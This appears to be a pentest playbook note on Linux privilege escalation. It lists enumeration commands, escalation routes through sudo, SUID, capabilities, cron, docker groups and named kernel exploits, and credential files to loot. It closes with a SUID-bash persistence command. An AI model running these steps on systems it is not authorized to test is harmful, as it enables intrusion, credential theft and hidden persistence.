---
summary: Linux privilege escalation — sudo, SUID, capabilities, cron, PATH, services, kernel; GTFOBins-driven.
status: active
tags: [security, playbook, privesc, linux]
private: false
---

# Linux Privilege Escalation

Enumerate as the foothold user, find one misconfiguration, become root.

## Automate the sweep

```bash
./linpeas.sh -a | tee lp.txt      # highlights the wins in red/yellow
# alternatives: pspy64 (watch cron/processes live), LinEnum, linux-smart-enumeration
```

## Manual checks (fastest wins first)

```bash
sudo -l                    # NOPASSWD / allowed binaries → GTFOBins
find / -perm -4000 -type f 2>/dev/null   # SUID
getcap -r / 2>/dev/null    # capabilities (cap_setuid, cap_dac_read_search)
crontab -l; cat /etc/crontab; ls -la /etc/cron.*   # scheduled tasks
id; groups                 # docker, lxd, disk, adm → known escalations
```

## The big categories

- **sudo**: any allowed binary → check [GTFOBins](https://gtfobins.github.io). Also env tricks (`LD_PRELOAD`, `LD_LIBRARY_PATH` if `env_keep`), `sudo` CVEs (Baron Samedit).
- **SUID / capabilities**: GTFOBins the binary; `cap_setuid+ep` on python/perl → instant root.
- **Cron / timers**: writable script or a `*` wildcard the root job runs → inject. `pspy` to catch hidden jobs.
- **Writable service / unit / PATH**: root process calls a relative binary you can plant.
- **Insecure deserialization run as root**: e.g. a sudo hook that `torch.load(weights_only=False)` an attacker-controlled file — the Bedsides root step.
- **Group memberships**: `docker` (`docker run -v /:/mnt ...`), `lxd`, `disk` (raw read of `/etc/shadow`), `adm` (read logs).
- **Kernel exploits (last resort)**: `uname -a` → DirtyPipe (5.8–5.16.11), DirtyCOW, PwnKit (`pkexec`), OverlayFS. Note version, verify before firing.

## Loot to grab

- `/etc/passwd`+`/etc/shadow` (unshadow → crack), SSH keys in `~/.ssh/`, history files, DB creds in web configs, `.env`, backup archives, and the shared mounts other services expose.

## Root confirmation

```bash
id     # uid=0
# stabilize: drop a SUID bash or add an authorized_key
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash   # /tmp/rootbash -p → euid 0
```

## Related

- [Pentest Playbook — Index](kb://11-security-playbook-pentest-playbook-index)
- [Windows Privilege Escalation](kb://11-security-playbook-windows-privesc)
- [Password Attacks & Hash Cracking](kb://11-security-playbook-password-attacks)
